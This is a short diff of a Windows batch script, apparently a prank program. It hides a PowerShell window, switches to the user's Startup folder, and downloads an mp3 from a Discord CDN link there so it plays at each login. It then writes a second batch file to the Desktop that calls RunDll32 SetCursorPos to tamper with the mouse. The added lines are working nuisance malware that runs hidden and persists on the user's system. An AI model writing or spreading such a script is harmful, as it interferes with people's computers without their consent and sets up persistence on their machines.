@@ -1,6 +1,10 @@
 @echo off
-powershell -window minimized -command "" 
 mode 30 , 01
+powershell -window minimized -command "" 
+cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+powershell wget -outf tittl.mp3 https://cdn.discordapp.com/attachments/806596260735614999/820859736241078303/rirck.mp3
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
 echo @echo off >> ppppppppppppppp.bat
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
